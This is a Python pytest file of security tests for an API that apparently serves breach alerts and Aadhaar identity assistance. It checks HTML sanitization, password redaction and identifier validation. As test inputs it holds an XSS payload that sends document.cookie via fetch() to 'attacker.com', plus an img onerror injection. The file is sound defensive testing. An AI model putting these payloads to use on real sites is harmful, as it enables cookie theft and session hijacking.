"""
Security threat tests and vulnerability checks.
Covers SEC-001 through SEC-020 and PRI-001 through PRI-020 from PRD Pages 65 & 67.
"""
import pytest
from httpx import AsyncClient, ASGITransport
from services.api.main import app
from services.api.database import init_db
from packages.redaction.sanitizer import sanitize_provider_html, redact_sensitive_secrets


@pytest.fixture(autouse=True)
async def setup_test_db():
    await init_db()


@pytest.mark.asyncio
async def test_xss_prevention_in_provider_content_sec_003():
    """Script injection in provider breach description must be stripped (SEC-003)."""
    malicious = "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script><b>Leak details</b>"
    cleaned = sanitize_provider_html(malicious)
    assert "<script>" not in cleaned
    assert "attacker.com" not in cleaned
    assert "<b>Leak details</b>" in cleaned


@pytest.mark.asyncio
async def test_stored_xss_in_assistance_reports_sec_004():
    """Stored XSS in user assistance reports is sanitized (SEC-004)."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        res_auth = await client.get("/api/v1/auth/callback?email=xss_test@domain.com")
        token = res_auth.json()["data"]["session_id"]

        xss_payload = "<img src=x onerror=alert(1)> Password=Compromised123! in SMS"
        res_report = await client.post(
            "/api/v1/identity-assistance/reports",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "category": "unsolicited_aadhaar_otp",
                "description": xss_payload
            }
        )
        assert res_report.status_code == 201
        data = res_report.json()["data"]
        # Password redacted
        assert "Compromised123!" not in data["description_redacted"]
        assert "[REDACTED_PASSWORD]" in data["description_redacted"]


@pytest.mark.asyncio
async def test_unsupported_identifier_length_rejected_pri_019():
    """Invalid Aadhaar length is rejected at API boundary (PRI-019)."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        res_auth = await client.get("/api/v1/auth/callback?email=aadhaar_check@domain.com")
        token = res_auth.json()["data"]["session_id"]

        res_bad = await client.post(
            "/api/v1/identifiers",
            headers={"Authorization": f"Bearer {token}"},
            json={"type": "aadhaar", "value": "1234"}  # Incomplete length
        )
        assert res_bad.status_code == 400
